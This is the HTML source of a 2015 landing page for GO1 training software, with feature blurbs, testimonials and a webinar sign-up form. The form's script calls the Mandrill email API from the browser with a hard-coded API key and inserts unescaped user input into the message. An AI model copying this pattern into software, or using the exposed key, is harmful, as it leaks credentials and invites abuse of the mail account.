        <div class="bounce2"></div>
        <div class="bounce3"></div>
      </div>
    </div>
    <!--END PAGE LOADER-->

    <!--BEGIN CONTENT-->
    <header class="fixed-header">
      <div class="utility-menu">
        <div class="container">
          <div class="utility-inner clearfix">
            <span><a href="#" class="zopim-chat"><i class="icon icon_chat"></i> Live Chat</a></span>
            <span><a target="_blank" href="https://go1support.zendesk.com/hc/en-us/requests/new"><i class="icon icon_lifesaver"></i> Help &amp; Support</a></span>
            <span><i class="icon icon_globe-2"></i> Language:
              <a href="#" class="language-switch dropdown-toggle" data-toggle="dropdown" > English <i class="icon arrow_carrot-down"></i>
              </a>
               <ul class="dropdown-menu" role="menu">
                    <li><a href="#">English <i class="icon icon_check "></i></a></li>
                    <li><a href="index_vn.html">Tiếng Việt </a></li>
                </ul>
            </span>
            <div class="pull-right">
              <a href="http://app.mygo1.com/" target="_blank" class="btn btn-primary btn-white btn-xs">Login</a>
              <a href="pricing.html" class="btn btn-primary btn-white btn-filled btn-xs">Sign Up</a>
            </div>
          </div>
        </div>
      </div>
      <nav id="main-nav" role="navigation" class="navbar">
        <div class="container">
          <div class="row">
            <div class="col-md-2 col-sm-3">
              <div class="navbar-header">
                <button type="button" data-toggle="collapse" data-target=".navbar-main-collapse" class="navbar-toggle collapsed">
                  <span class="sr-only">Toggle navigation</span><span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span>
                </button>
                <a id="logo" href="index-2.html" class="navbar-brand"><img src="images/logo.png" alt="Go1" class="img-responsive" /></a>
              </div>
            </div>
            <div class="col-md-10 col-sm-9">
              <!-- Collect the nav links, and other content for toggling -->
              <div class="navbar-main-collapse collapse navbar-collapse">
                <ul class="nav navbar-nav">
                  <li>
                    <a href="features.html">Features</a>
                  </li>
                  <li>
                    <a href="case-studies.html">Case Studies</a>
                  </li>
                  <li>
                    <a href="pricing.html">Pricing</a>
                  </li>
                  <li>
                    <a href="contact.html">Contact Us</a>
                  </li>
<!--
                  <li class="dropdown">
                    <a href="#" class="dropdown-toggle" data-toggle="dropdown" data-hover="dropdown">More <span class="caret"></span></a>
                    <ul class="dropdown-menu" role="menu">
                      <li><a href="#">Action</a></li>
                      <li><a href="#">Another action</a></li>
                      <li>
                        <a href="#">Something else here</a>
                      </li>
                      <li class="divider"></li>
                      <li>
                        <a href="#">Separated link</a>
                      </li>
                      <li class="divider"></li>
                      <li>
                        <a href="#">One more separated link</a>
                      </li>
                    </ul>
                  </li>
-->
                  <li>
                    <a href="http://app.mygo1.com/" target="_blank" class="hidden-lg hidden-md">Login</a>
                  </li>
                  <li>
                    <a href="pricing.html" class="hidden">Sign Up</a>
                  </li>
                </ul>

                <ul class="nav navbar-nav navbar-right social-icons hidden-xs">
                  <li><a target="_blank" href="https://twitter.com/go1creative"><i class="icon social_twitter"></i></a></li>
                  <li><a target="_blank" href="https://www.facebook.com/go1com"><i class="icon social_facebook"></i></a></li>
                  <li>
                    <a target="_blank" href="https://www.linkedin.com/company/go1-digital-agency"><i class="icon social_linkedin"></i></a>
                  </li>
                </ul>
                <ul class="nav navbar-right sign-up">
                  <li><a class="btn btn-secondary btn-register btn-filled btn-sm" href="pricing.html">SIGN UP NOW</a></li>
                </ul>
              </div><!-- /.navbar-collapse -->
            </div>
          </div>
        </div>
      </nav>
    </header>

    <section class="intro image-right-outside">
      <div class="container">
        <div class="row">
          <div class="col-lg-7 col-md-5 col-sm-7 col-xs-12">
            <h1 class="text-white">Training Software for Businesses</h1>
            <p class="lead text-white">
              GO1 is software that allows you to train your staff and customers. You can quickly create your own courses or use one of the existing courses in our growing marketplace.
            </p>
            <a href="pricing.html" class="btn btn-secondary btn-register btn-filled btn-sm">SIGN UP NOW</a>
            <a href="features.html" class="btn btn-secondary btn-white btn-sm">FIND OUT MORE</a>
          </div>
        </div>
      </div>
      <div class="product-image">
        <img src="images/product-image.png" alt="product image">
      </div>
    </section>

    <div class="main-container">

      <section class="highlight highlight-1">
        <div class="container">
          <div class="row clearfix">
            <div class="col-sm-9 col-xs-12 pull-left">
              <h3 class="text-white"><strong>Join over 150,000 users.</strong> It will only take a minute</h3>
            </div>
            <div class="col-sm-3 col-xs-12 pull-right text-right">
              <a href="pricing.html" class="btn btn-primary btn-white btn-sm">Sign Up</a> 
            </div>
          </div>
        </div>
      </section>

      <section class="training">
        <div class="container">
          <div class="row">
            <div class="col-sm-6 text-center">
              <a class="video" href="http://www.youtube.com/v/216YyZCVl4Q?fs=1&amp;autoplay=1">
              	<img alt="training screen" src="images/training-screen.png">
              </a>
            </div>
            <div class="col-sm-6 align-vertical">
              <h2>Delivering training can be hard.
                <br />
                <strong>GO1</strong> makes it easy.</h2>
              <p class="lead">
                Instant set up and simple to use for both administrators and end users. You shouldn’t need to learn how to learn.
              </p>
              <a href="features.html" class="btn btn-primary btn-sm">How it Works</a>
            </div>
          </div>
        </div>
      </section>

      <section class="course">
        <div class="container">
          <div class="row">
            <div class="col-sm-6 align-vertical">
              <h2>Built for staff training.
                <br />
                With our course <strong>marketplace</strong>.</h2>
              <p class="lead">
                Get started with an array of courses immediately at your fingertips. Assign staff to any course in our growing marketplace or build your own course.
              </p>
              <a href="features.html" class="btn btn-primary btn-sm">Learn More</a>
            </div>
            <div class="col-sm-6 text-center">
              <img alt="course screen" src="images/course-screen.png">
            </div>
          </div>
        </div>
      </section>

      <section class="training-organization nopadding-bottom">
        <div class="container">
          <div class="row">
            <div class="col-sm-6 text-center">
              <img alt="training organization" src="images/training-organization.png">
            </div>
            <div class="col-sm-6 align-vertical">
              <h2>... And for <strong>training organisations.</strong></h2>
              <p class="lead">
                You can customise every aspect of your portal with your own logo and colours. Better yet you can turn on student registration and ecommerce to sell your courses to the world.
              </p>
              <a href="features.html" class="btn btn-primary btn-sm">Learn More</a>
            </div>
          </div>
        </div>
      </section>

      <section class="features">
        <div class="container">
          <div class="row">
            <div class="col-md-12 text-center">
              <h2><strong>GO1</strong> has the features you need.</h2>
            </div>
          </div>
          <div class="row">
            <div class="col-lg-3 col-md-3 col-sm-6 col-xs-12">
              <div class="feature-icon-large">
                <i class="icon icon-notebook"></i>
                <h5>Course Library</h5>
                <p class="text-center">
                  Curate training, don’t recreate it! Assign & access courses instantly.
                </p>
              </div>
            </div>
            <div class="col-lg-3 col-md-3 col-sm-6 col-xs-12">
              <div class="feature-icon-large">
                <i class="icon icon-mobile "></i>
                <h5>Mobile & PC</h5>
                <p class="text-center">
                  Web, mobile and tablet users are fully catered for.
                </p>
              </div>
            </div>
            <div class="col-lg-3 col-md-3 col-sm-6 col-xs-12">
              <div class="feature-icon-large">
                <i class="icon icon-basket"></i>
                <h5>Accept Payments</h5>
                <p class="text-center">
                  Charge for courses or make them freely available.
                </p>
              </div>
            </div>
            <div class="col-lg-3 col-md-3 col-sm-6 col-xs-12">
              <div class="feature-icon-large">
                <i class="icon icon-expand"></i>
                <h5>Configure & Extend</h5>
                <p class="text-center">
                  Add new fields, create reports, or develop integrations through our API.
                </p>
              </div>
            </div>

          </div>
          <div class="row text-center">
            <a href="features.html" class="btn btn-primary btn-sm">See more features</a>
          </div>
        </div>
      </section>

      <section class="pricing">
        <div class="container">
          <div class="row">
            <div class="col-md-12 text-center">
              <h2>Simple Pricing.</h2>
              <br />
            </div>
          </div>
          <div class="row">
            <div class="col-md-12 text-center">
              <h2>Brighter learning isn’t expensive: <strong>free</strong> or a flat monthly fee.</h2>
              <br />
            </div>
          </div>
          <div class="row text-center" style="margin-bottom: 40px">
            <a href="pricing.html" class="btn btn-primary btn-filled btn-sm" style="margin-right: 15px">Create a training portal</a>
            <a href="pricing.html" class="btn btn-primary btn-sm">View Plans</a>
          </div>
        </div>
      </section>

      <section class="testimonials">
        <div class="container">
          <div class="row">
            <div class="col-md-12 text-center">
              <h2>Businesses love <strong>GO1</strong></h2>
              <br />
            </div>
          </div>
          <div class="row">
            <div class="col-md-4">
              <div class="col-md-12">
                <div class="text-center">
                  <p>
                    "GO1 reduces consulting times and costs, which is a major advantage for both us and our clients.
                    It empowers clients to learn on their own schedule and is so easy to use that even if you just click through it you’re going to learn something."
                  </p>
                  <div class="author-image"><img class="circle" src="images/nicole_leap_circle.png" alt="Nicole Keighery">
                  </div>
                  <div class="author-name">
                    Nicole Keighery
                    <br />
                    Documentation Co-ordinator
                  </div>
                </div>
              </div>
            </div>

            <div class="col-md-4">
              <div class="col-md-12">
                <div class="text-center">
                  <p>
                    "GO1 is a robust LMS, with a complete set of tools to create and manage courses. Our current users are aged 30 - 50 years old,
                    with little or no experience using computers. With GO1 the need little guidance to use the system. It is really simple and easy to use."
                  </p>
                  <div class="author-image"><img class="circle" src="images/Educaruno.jpg" alt="JUAN CARLOS VILLEGAS">
                  </div>
                  <div class="author-name" style="width: 200px;">
                    JUAN CARLOS VILLEGAS
                    <br />
                    Educaruno Technology Manager
                  </div>
                </div>
              </div>
            </div>

            <div class="col-md-4">
              <div class="col-md-12">
                <div class="text-center">
                  <p>
                    "I’m impressed with GO1 - my 2014 LMS Newcomer of the Year. Strong in social, gamification is solid and multi-tenant are just a blissful. A UI that will remind you of Windows metro, with a feature set to match, showcases the power of the platform. I do like the very modern UI and nice folks too."
                  </p>
                  <div class="author-image"><img class="circle" src="images/CraigWeiss.jpg" alt="Kev Price">
                  </div>
                  <div class="author-name">
                    CRAIG WEISS
                    <br />
                    State of the LMS report
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      <section class="highlight highlight-2">
        <div class="container">
          <div class="row clearfix">
            <form method="post" class="mail-list-signup" id="mail-list-signup">
              <div class="col-sm-9 col-xs-12 pull-left clear-fix">
                <h3 class="text-white pull-left"><strong>Want to find out more?</strong> Book a webinar.&nbsp;</h3>
                <input class="signup-email-field" required="required" placeholder="Enter your email here..." name="email" id="email" type="email">
              </div>
              <div class="col-sm-3 col-xs-12 pull-right text-right">
                <input class="btn btn-primary btn-white btn-xs" id="book-email" name="contact-submit" value="Book Now" type="submit">
              </div>
            </form>
          </div>
        </div>
      </section>

    </div><!-- /.main-container -->

    <section id="footer" class="footer">
      <div class="container">
        <div class="row">
          <div class="col-sm-4">
            <img class="logo" alt="GO1" src="images/logo-dark.png">
            <p>
              We unlock positive potential in people and organisations. How? Through our award-winning training and learning portal.
            </p>
          </div>
          <div class="col-sm-2">
            <h3 class="title">Popular</h3>
            <ul class="menu">
              <li class="first">
                <a href="pricing.html">Pricing</a>
              </li>
              <li>
                <a href="features.html">How It Works</a>
              </li>
              <li>
                <a href="case-studies.html">Case Studies</a>
              </li>
              <!-- <li>
                <a href="#">For Businesses</a>
              </li>
              <li>
                <a href="#">For Training Organisations</a>
              </li> -->
              <li class="last">
                <a href="pricing.html">Sign Up</a>
              </li>
            </ul>
          </div>
          <div class="col-sm-2">
            <h3 class="title">Resources</h3>
            <ul class="menu">
              <li class="first">
                <a target="_blank" href="https://go1support.zendesk.com/hc/en-us">Support Portal</a>
              </li>
              <li>
                <a target="_blank" href="http://status.adurolms.com/">System Status</a>
              </li>
              <li>
                <a target="_blank" href="http://api.adurolms.com/api/index.html">API Reference</a>
              </li>
            </ul>
          </div>
          <div class="col-sm-2">
            <h3 class="title">Company</h3>
            <ul class="menu">
              <li class="first">
                <!-- <a href="#">About</a>
              </li>
              <li>
                <a href="#">Blog</a>
              </li>
              <li>
                <a href="#">Careers</a>
              </li>
              <li class="last"> -->
                <a href="contact.html">Contact</a>
              </li>
            </ul>
          </div>
          <div class="col-sm-2">
            <h3 class="title">Social Profiles</h3>
            <ul class="social-icons inline-menu">
              <li><a target="_blank" href="https://twitter.com/go1creative"><i class="icon social_twitter"></i></a></li>
              <li><a target="_blank" href="https://www.facebook.com/go1com"><i class="icon social_facebook"></i></a></li>
              <li>
                <a target="_blank" href="https://www.linkedin.com/company/go1-digital-agency"><i class="icon social_linkedin"></i></a>
              </li>
            </ul>
          </div>
        </div>
        <div class="row copyright">
          <div class="col-sm-12">
            <span class="sub">© Copyright 2015 GO1 - All Rights Reserved</span>
            <ul class="inline-menu">
              <li>
                <a href="tos.html">Terms of Service</a>
              </li>
              <li>
                <a href="policy.html">Privacy Policy</a>
              </li>
            </ul>
          </div>
        </div>
      </div>
    </section>
    <!--END CONTENT-->


    <!--loading vendors js-->
    <script src="vendors/jquery-1.10.2.min.js"></script>
    <script src="vendors/bootstrap/js/bootstrap.min.js"></script>
    <script src="vendors/bootstrap-hover-dropdown/bootstrap-hover-dropdown.js"></script>
    <script src="vendors/html5shiv.js"></script>
    <script src="vendors/respond.min.js"></script>
    <script src="vendors/modernizr.custom.97074.js"></script>
    <script src="vendors/wow/wow.min.js"></script>
    <script type="text/javascript" src="js/fancybox/source/jquery.fancybox.pack.js"></script>
    <script type="text/javascript" src="js/fancybox/source/helpers/jquery.fancybox-media.js"></script>
    <!--CORE JAVASCRIPT-->
    <script src="js/main.js"></script>
    <!--Loading jgrowl js-->
    <script src="../cdnjs.cloudflare.com/ajax/libs/jquery-jgrowl/1.4.1/jquery.jgrowl.min.js"></script>
    <!--Sending mail-->
    <script>
      jQuery(function($){
        var form = $("#mail-list-signup");
        form.submit(function() {
          var email = $("#email").val();
          var msg = '<div class"book-webinar">There is a new user book for webinar: ' + email + '</div>';
          $.ajax(
            {
              type: "POST",
              url: "https://mandrillapp.com/api/1.0/messages/send.json",
              data: {
                'key': 'OGkM0a6-ROqot0i_VazG3w',
                'message': {
                  'from_email': 'noreply@go1.com.au',
                  'from_name': 'GO1',
                  'subject': 'Book a webinar',
                  'html': msg,
                  //'bcc_address': 'nguyen.tran@go1.com.au',
                  'to': [{'email':'leads@go1.com.au'}]
                }
              }
            })
          .done(function(response) {
            $.jGrowl("Success! you've successfully booked a webinar", { life: 5000 });
            $("#email").val(''); // reset email after successful submission
          })
          .fail(function(response) {
            $.jGrowl("Error occurs when sending mail", { life: 5000 });
          });
          return false;
        });
      });
    </script>
    <script>
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','../www.google-analytics.com/analytics.js','ga');

      ga('create', 'UA-25779687-9', 'auto');
      ga('send', 'pageview');

    </script>
    <!--Go1 Stats-->
    <script type="text/javascript">
      var gostats_site_ids = gostats_site_ids || [];
      gostats_site_ids.push(122721);
      (function() {
        var s = document.createElement('script');
        s.type = 'text/javascript';
        s.async = true;
        s.src = 'http://stats.go1.com.au/js';
        ( document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0] ).appendChild( s );
      })();
    </script>
    <noscript><p><img alt="GO Stats" width="1" height="1" src="../stats.go1.com.au/122721ns.gif" /></p></noscript>
  </body>
<?php endif; ?>
</html>
